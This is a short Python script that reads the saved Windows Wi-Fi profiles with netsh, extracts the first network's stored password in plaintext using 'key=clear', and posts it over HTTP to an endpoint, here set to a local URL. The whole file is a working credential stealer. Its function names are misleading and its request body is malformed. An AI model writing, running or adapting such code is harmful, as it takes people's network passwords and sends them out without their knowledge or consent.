import subprocess
import requests

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profiles[0], 'key=clear']).decode('utf-8').split('\n')
results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
def ipGet():
    try:
        return results[0]
    except IndexError:
        return 0
print(ipGet())

API_ENDPOINT = "http://localhost/password"
  
data = '{"passwd", "'+ipGet()+'"}'

response = requests.post(url = API_ENDPOINT, data = data)

print(response)